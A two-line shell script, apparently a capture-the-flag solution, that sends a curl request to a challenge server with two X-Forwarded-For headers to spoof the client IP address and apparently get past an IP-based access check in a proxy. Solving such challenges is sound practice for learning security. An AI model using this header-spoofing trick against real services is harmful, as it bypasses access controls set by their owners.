#!/bin/sh

curl http://actually.proxed.duc.tf:30009/ -H 'X-Forwarded-For: 5.2.6.9' -H 'X-Forwarded-For:31.33.33.7'
